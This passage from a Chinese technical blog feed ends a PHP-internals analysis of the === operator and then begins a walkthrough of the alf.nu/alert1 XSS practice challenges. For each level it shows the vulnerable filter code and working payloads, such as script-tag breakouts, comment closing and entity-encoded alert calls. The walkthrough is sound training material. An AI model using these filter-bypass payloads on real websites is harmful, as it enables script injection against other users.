class="hljs-keyword">case</span> IS_TRUE: <span class="hljs-comment">// 如果是NULL和布尔型，则返回1</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br><span class="hljs-keyword">case</span> IS_LONG: <span class="hljs-comment">// 如果是长整型，直接获取值判断是否相等，并返回</span><br><span class="hljs-keyword">return</span> (Z_LVAL_P(op1) == Z_LVAL_P(op2));<br><span class="hljs-keyword">case</span> IS_RESOURCE: <span class="hljs-comment">// 如果是资源类型，直接获取值判断是否相等，并返回</span><br><span class="hljs-keyword">return</span> (Z_RES_P(op1) == Z_RES_P(op2));<br><span class="hljs-keyword">case</span> IS_DOUBLE: <span class="hljs-comment">// 如果是浮点型，直接获取值判断是否相等，并返回</span><br><span class="hljs-keyword">return</span> (Z_DVAL_P(op1) == Z_DVAL_P(op2));<br><span class="hljs-keyword">case</span> IS_STRING: <span class="hljs-comment">// 如果是字符串，判断是否是同一个字符串，或者字符串值得长度相同，每一个字节都相同</span><br><span class="hljs-keyword">return</span> (Z_STR_P(op1) == Z_STR_P(op2) ||<br>(Z_STRLEN_P(op1) == Z_STRLEN_P(op2) &amp;&amp;<br> <span class="hljs-built_in">memcmp</span>(Z_STRVAL_P(op1), Z_STRVAL_P(op2), Z_STRLEN_P(op1)) == <span class="hljs-number">0</span>));<br><span class="hljs-keyword">case</span> IS_ARRAY: <span class="hljs-comment">// 如果是数组，判断是否为同一个数组，或者调用zend_hash_compare进行判断</span><br><span class="hljs-keyword">return</span> (Z_ARRVAL_P(op1) == Z_ARRVAL_P(op2) ||<br>zend_hash_compare(Z_ARRVAL_P(op1), Z_ARRVAL_P(op2), (<span class="hljs-keyword">compare_func_t</span>) hash_zval_identical_function, <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>);<br><span class="hljs-keyword">case</span> IS_OBJECT: <span class="hljs-comment">// 如果是对象，判断对象的值和对象指向的handler是否相同</span><br><span class="hljs-keyword">return</span> (Z_OBJ_P(op1) == Z_OBJ_P(op2) &amp;&amp; Z_OBJ_HT_P(op1) == Z_OBJ_HT_P(op2));<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 不是上述已知类型，则返回0</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>经过以上分析我们可以知道，<code>result</code>为<code>1</code>时，返回<code>true</code>，<code>result</code>为<code>0</code>时，返回<code>false</code>。<br><code>===</code>运算符在内部实现上要比<code>==</code>要简单的多，只有满足类型相同，对应的值也相同的变量才能满足条件，而且不会进行类型转换。<br>当然，在对变量值进行比较的过程中，不同的变量也会有不同的规则，比如数组。</p><p>在手册中，我们知道</p><blockquote><p>具有较少成员的数组较小，如果运算数 1 中的键不存在于运算数 2 中则数组无法比较，否则挨个值比较</p></blockquote><p>在<code>zend_is_identical</code>中我们跟进<code>zend_hash_compare</code>，可以找到<code>zend_hash_compare_impl</code>。<br>路径：<code>Zend/zend_hash.c:2313</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">static</span> zend_always_inline <span class="hljs-keyword">int</span> <span class="hljs-title">zend_hash_compare_impl</span><span class="hljs-params">(HashTable *ht1, HashTable *ht2, <span class="hljs-keyword">compare_func_t</span> compar, zend_bool ordered)</span> </span>&#123;<br><span class="hljs-keyword">uint32_t</span> idx1, idx2;<br><br><span class="hljs-keyword">if</span> (ht1-&gt;nNumOfElements != ht2-&gt;nNumOfElements) &#123; <span class="hljs-comment">// 当长度不相同时，较长的数组大于较短的数组</span><br><span class="hljs-keyword">return</span> ht1-&gt;nNumOfElements &gt; ht2-&gt;nNumOfElements ? <span class="hljs-number">1</span> : <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span> (idx1 = <span class="hljs-number">0</span>, idx2 = <span class="hljs-number">0</span>; idx1 &lt; ht1-&gt;nNumUsed; idx1++) &#123; <span class="hljs-comment">// 长度相同，遍历数组，挨个值进行比较。</span><br>Bucket *p1 = ht1-&gt;arData + idx1, *p2;<br>zval *pData1, *pData2;<br><span class="hljs-keyword">int</span> result;<br><br><span class="hljs-keyword">if</span> (Z_TYPE(p1-&gt;val) == IS_UNDEF) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// 如果类型未定义，直接继续</span><br><span class="hljs-keyword">if</span> (ordered) &#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>ZEND_ASSERT(idx2 != ht2-&gt;nNumUsed);<br>p2 = ht2-&gt;arData + idx2;<br><span class="hljs-keyword">if</span> (Z_TYPE(p2-&gt;val) != IS_UNDEF) <span class="hljs-keyword">break</span>;<br>idx2++;<br>&#125;<br><span class="hljs-keyword">if</span> (p1-&gt;key == <span class="hljs-literal">NULL</span> &amp;&amp; p2-&gt;key == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">/* 数字索引 */</span><br><span class="hljs-keyword">if</span> (p1-&gt;h != p2-&gt;h) &#123;<br><span class="hljs-keyword">return</span> p1-&gt;h &gt; p2-&gt;h ? <span class="hljs-number">1</span> : <span class="hljs-number">-1</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p1-&gt;key != <span class="hljs-literal">NULL</span> &amp;&amp; p2-&gt;key != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">/* 字符串索引 */</span><br><span class="hljs-keyword">if</span> (ZSTR_LEN(p1-&gt;key) != ZSTR_LEN(p2-&gt;key)) &#123;<br><span class="hljs-keyword">return</span> ZSTR_LEN(p1-&gt;key) &gt; ZSTR_LEN(p2-&gt;key) ? <span class="hljs-number">1</span> : <span class="hljs-number">-1</span>;<br>&#125;<br><br>result = <span class="hljs-built_in">memcmp</span>(ZSTR_VAL(p1-&gt;key), ZSTR_VAL(p2-&gt;key), ZSTR_LEN(p1-&gt;key));<span class="hljs-comment">// 获取两个key对应的值来进行对比</span><br><span class="hljs-keyword">if</span> (result != <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 当存在不相等的成员时，返回结果。</span><br><span class="hljs-keyword">return</span> result;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Mixed key types: A string key is considered as larger */</span><br><span class="hljs-keyword">return</span> p1-&gt;key != <span class="hljs-literal">NULL</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">-1</span>;<br>&#125;<br>pData2 = &amp;p2-&gt;val;<br>idx2++;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (p1-&gt;key == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">/* 数字索引 */</span><br>pData2 = zend_hash_index_find(ht2, p1-&gt;h);<br><span class="hljs-keyword">if</span> (pData2 == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">/* 字符串索引 */</span><br>pData2 = zend_hash_find(ht2, p1-&gt;key);<br><span class="hljs-keyword">if</span> (pData2 == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br>&#125;<br><br>pData1 = &amp;p1-&gt;val;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(pData1) == IS_INDIRECT) &#123; <span class="hljs-comment">// 如果变量是间接zval</span><br>pData1 = Z_INDIRECT_P(pData1); <span class="hljs-comment">// pData1获取它所指向的zval</span><br>&#125;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(pData2) == IS_INDIRECT) &#123; <span class="hljs-comment">// 如果变量是间接zval</span><br>pData2 = Z_INDIRECT_P(pData2);  <span class="hljs-comment">// pData2获取它所指向的zval</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (Z_TYPE_P(pData1) == IS_UNDEF) &#123; <br><span class="hljs-keyword">if</span> (Z_TYPE_P(pData2) != IS_UNDEF) &#123; <span class="hljs-comment">// 如果pData1是未定义的变量，而pData2不是未定义的变量，则pData1所在的数组 &lt; pData2所在的数组</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_TYPE_P(pData2) == IS_UNDEF) &#123; <span class="hljs-comment">// 如果pData1不是未定义的变量，而pData2是未定义的变量，则pData1所在的数组 &gt; pData2所在的数组</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>result = compar(pData1, pData2); <span class="hljs-comment">// 如果两者都是不是未定义的变量，则进入compar进行比较</span><br><span class="hljs-keyword">if</span> (result != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>以下是手册中，<code>===</code>在面对不同变量的时候运算结果表。<br><img src="https://image.mengsec.com/php-learn/20190616154043.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://secure.php.net/manual/zh/">https://secure.php.net/manual/zh/</a></li><li><a href="http://www.php-internals.com/book/?p=C-php-vld">http://www.php-internals.com/book/?p=C-php-vld</a></li><li>书籍：《PHP 7底层设计与源码实现》</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS靶场练习（二）</title>
    <link href="/2019/06/14/alert1-to-win/"/>
    <url>/2019/06/14/alert1-to-win/</url>
    
    <content type="html"><![CDATA[<p>XSS靶场（alf.nu/alert1）部分题目详解（26/29），本文首发<a href="https://xz.aliyun.com/t/5391">先知社区</a></p><a id="more"></a><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近深感自己前端安全知识掌握的不是很好，于是找了个<a href="https://alf.nu/alert1">XSS靶场</a>练习下，截止到2019年6月9日，网站上共有29道题目，我当前只做出了26道，还有3道题目没有头绪，分别是<code>Fruit 3</code>、<code>Quine</code>、<code>Entities 2</code>，当然已经做出的这些题目也不一定是最优解，希望与师傅们交流学习下，如果有发现什么错误，欢迎师傅们批评指正。</p><p>我的链接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://alf.nu/alert(<span class="hljs-number">1</span>)#accesstoken=WcMW<span class="hljs-number">1</span>j+qtfFu<span class="hljs-number">6</span>BQVFdJM<br></code></pre></td></tr></table></figure><p>浏览器版本：<code>Chrome 74</code></p><h2 id="1-Warmup"><a href="#1-Warmup" class="headerlink" title="1. Warmup"></a>1. Warmup</h2><h3 id="1-1-源码"><a href="#1-1-源码" class="headerlink" title="1.1 源码"></a>1.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="1-2-分析"><a href="#1-2-分析" class="headerlink" title="1.2 分析"></a>1.2 分析</h3><p>代码将输入直接拼接到了返回的字符串中，没有任何过滤，直接闭合<code>console.log(&quot;</code>即可。</p><h3 id="1-3-Payload"><a href="#1-3-Payload" class="headerlink" title="1.3 Payload"></a>1.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">13</span>个字符<br><span class="hljs-string">&quot;);alert(1)//</span><br><span class="hljs-string">12个字符</span><br><span class="hljs-string">&quot;</span>);alert(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><a href="https://image.mengsec.com/xss-alf.nu/20190604213729.png" title="1"><img src="https://image.mengsec.com/xss-alf.nu/20190604213729.png" alt="1" title="1"></a></p><h2 id="2-Adobe"><a href="#2-Adobe" class="headerlink" title="2. Adobe"></a>2. Adobe</h2><h3 id="2-1-源码"><a href="#2-1-源码" class="headerlink" title="2.1 源码"></a>2.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    s = s.replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-分析"><a href="#2-2-分析" class="headerlink" title="2.2 分析"></a>2.2 分析</h3><p>代码将输入的双引号加了一个<code>\</code>进行了转义，这样我们就不能像第一题那样闭合<code>console.log</code>了，但是没啥影响，有两种方法：</p><ul><li>闭合之前的<code>&lt;script&gt;</code>标签，然后再写一个<code>&lt;script&gt;</code>。</li><li>使用<code>\</code>来转义对<code>&quot;</code>进行转义的<code>\</code>，从而绕过对<code>&quot;</code>的过滤。</li></ul><h3 id="2-3-Payload"><a href="#2-3-Payload" class="headerlink" title="2.3 Payload"></a>2.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">方法<span class="hljs-number">1</span> <span class="hljs-number">27</span>个字符<br>&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;alert(1)/</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">方法2 14个字符</span><br><span class="hljs-regexp">\&quot;);alert(1)/</span><span class="hljs-regexp">/</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190604214819.png"></p><h2 id="3-JSON"><a href="#3-JSON" class="headerlink" title="3. JSON"></a>3. JSON</h2><h3 id="3-1-源码"><a href="#3-1-源码" class="headerlink" title="3.1 源码"></a>3.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    s = <span class="hljs-built_in">JSON</span>.stringify(s);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&#x27;</span> + s + <span class="hljs-string">&#x27;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-2-分析"><a href="#3-2-分析" class="headerlink" title="3.2 分析"></a>3.2 分析</h3><p>代码将输入使用<code>JSON.stringify</code>进行了处理，与第二题的方法一思路相同。</p><h3 id="3-3-Payload"><a href="#3-3-Payload" class="headerlink" title="3.3 Payload"></a>3.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;alert(1)/</span><span class="hljs-regexp">/</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190609151017.png"></p><h2 id="4-Markdown"><a href="#4-Markdown" class="headerlink" title="4. Markdown"></a>4. Markdown</h2><h3 id="4-1-源码"><a href="#4-1-源码" class="headerlink" title="4.1 源码"></a>4.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> text = s.replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>);<br>    <span class="hljs-comment">// URLs</span><br>    text = text.replace(<span class="hljs-regexp">/(http:\/\/\S+)/g</span>, <span class="hljs-string">&#x27;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&#x27;</span>);<br>    <span class="hljs-comment">// [[img123|Description]]</span><br>    text = text.replace(<span class="hljs-regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="hljs-string">&#x27;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> text;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-2-分析"><a href="#4-2-分析" class="headerlink" title="4.2 分析"></a>4.2 分析</h3><p>代码进行了三步操作</p><ol><li>第一步，将<code>&lt;</code>和<code>&quot;</code>转成了HTML实体</li><li>第二步，如果存在<code>http://</code>的字符串， 会可以生成一个<code>a</code>标签</li><li>第三步，解析Markdown的图片的语法，如果存在<code>[[img123|Description]]</code>格式的字符串，则变为<code>&lt;img alt=&quot;Description&quot; src=&quot;img123.gif&quot;&gt;</code>。</li></ol><p>开头对<code>&quot;</code>和<code>&lt;</code>进行了编码操作，所以不能直接传入<code>&quot;</code>来闭合，当前思路就是构造一个字符串，使其满足后两个正则，从而引入<code>a</code>标签中的<code>&quot;</code>，从而闭合<code>img</code>标签的<code>alt</code>属性。</p><h3 id="4-3-Payload"><a href="#4-3-Payload" class="headerlink" title="4.3 Payload"></a>4.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[[a|http:<span class="hljs-comment">//onerror=alert(1)//]]</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190604223045.png"></p><h2 id="5-DOM"><a href="#5-DOM" class="headerlink" title="5. DOM"></a>5. DOM</h2><h3 id="5-1-源码"><a href="#5-1-源码" class="headerlink" title="5.1 源码"></a>5.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-comment">// Slightly too lazy to make two input fields.</span><br>    <span class="hljs-comment">// Pass in something like &quot;TextNode#foo&quot;</span><br>    <span class="hljs-keyword">var</span> m = s.split(<span class="hljs-regexp">/#/</span>);<br><br>    <span class="hljs-comment">// Only slightly contrived at this point.</span><br>    <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    a.appendChild(<span class="hljs-built_in">document</span>[<span class="hljs-string">&#x27;create&#x27;</span> + m[<span class="hljs-number">0</span>]].apply(<span class="hljs-built_in">document</span>, m.slice(<span class="hljs-number">1</span>)));<br>    <span class="hljs-keyword">return</span> a.innerHTML;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-2-分析"><a href="#5-2-分析" class="headerlink" title="5.2 分析"></a>5.2 分析</h3><p>代码实现了一个根据输入来创建的<code>DOM</code>节点的功能。<br>如果输入是<code>TextNode#foo</code>，那么执行的代码就是<code>document.createTextNode(&quot;foo&quot;)</code>。<br>根据格式查一下手册</p><p><img src="https://image.mengsec.com/xss-alf.nu/20190609154441.png"></p><p>列一下几个常用的：</p><ul><li><code>createElement()</code> 创建一个元素节点</li><li><code>createTextNode()</code> 创建一个文本节点</li><li><code>createAttribute()</code> 创建一个属性节点</li><li><code>createComment()</code> 创建一个注释节点</li></ul><p>经过尝试，通过<code>createComment()</code>创建一个注释节点，然后闭合注释可以达到代码执行的目的。</p><h3 id="5-3-Payload"><a href="#5-3-Payload" class="headerlink" title="5.3 Payload"></a>5.3 Payload</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">34</span>个字符<br>Comment#&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br><span class="hljs-number">32</span>个字符<br>Comment#&gt;&lt;iframe onload=alert(1)<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190609154813.png"></p><h2 id="6-Callback"><a href="#6-Callback" class="headerlink" title="6. Callback"></a>6. Callback</h2><h3 id="6-1-源码"><a href="#6-1-源码" class="headerlink" title="6.1 源码"></a>6.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-comment">// Pass inn &quot;callback#userdata&quot;</span><br>    <span class="hljs-keyword">var</span> thing = s.split(<span class="hljs-regexp">/#/</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z\[\]&#x27;]*$/</span>.test(thing[<span class="hljs-number">0</span>])) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid callback&#x27;</span>;<br>    <span class="hljs-keyword">var</span> obj = &#123;<br>        <span class="hljs-string">&#x27;userdata&#x27;</span>: thing[<span class="hljs-number">1</span>]<br>    &#125;;<br>    <span class="hljs-keyword">var</span> json = <span class="hljs-built_in">JSON</span>.stringify(obj).replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;\\u003c&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;&quot;</span> + thing[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;(&quot;</span> + json + <span class="hljs-string">&quot;)&lt;/script&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-2-分析"><a href="#6-2-分析" class="headerlink" title="6.2 分析"></a>6.2 分析</h3><p>代码首先将输入的字符串按照<code>#</code>分割为两部分，第一部分是回调函数，只能使用大小写字母、<code>[</code>、<code>]</code>、<code>&#39;</code>，第二部分是<code>JSON</code>数据。<br>而且后面又将<code>JSON</code>数据中的尖括号转义成了<code>\\u003c</code>。<br>最终的目的依旧是执行<code>JS</code>代码，<code>thing[0]</code>部分不一定是一个函数，只要满足要求就OK。<br>既然回调函数名部分和后面的值都没有过滤单引号，可以在前后放两个单引号，从而闭合它们之间的值。再加个分号作为分割，后面就好操作了。</p><h3 id="6-3-Payload"><a href="#6-3-Payload" class="headerlink" title="6.3 Payload"></a>6.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27;#&#x27;</span>;alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190605090815.png"></p><p>简单分析一下最终的执行过程，通过两个单引号闭合数据。在这里是<code>&#39;(&#123;&quot;userdata&quot;:&quot;&#39;</code>，在<code>alert(1)</code>后面加个注释符将后面的无效数据注释掉，也就是<code>//&quot;&#125;)</code>。剩余的代码也就成功执行了。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-string">&#x27;(&#123;&quot;userdata&quot;:&quot;&#x27;</span>;alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//&quot;&#125;)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="7-Skandia"><a href="#7-Skandia" class="headerlink" title="7. Skandia"></a>7. Skandia</h2><h3 id="7-1-源码"><a href="#7-1-源码" class="headerlink" title="7.1 源码"></a>7.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s.toUpperCase() + <span class="hljs-string">&#x27;&quot;)&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-2-分析"><a href="#7-2-分析" class="headerlink" title="7.2 分析"></a>7.2 分析</h3><p>很容易就能闭合标签，但是方法<code>alert(1)</code>，被转换成大写了，无法执行，尝试编码绕过。</p><h3 id="7-3-Payload"><a href="#7-3-Payload" class="headerlink" title="7.3 Payload"></a>7.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">54</span>个字符<br>&lt;/script&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190606100017.png"></p><h2 id="8-Template"><a href="#8-Template" class="headerlink" title="8. Template"></a>8. Template</h2><h3 id="8-1-源码"><a href="#8-1-源码" class="headerlink" title="8.1 源码"></a>8.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span 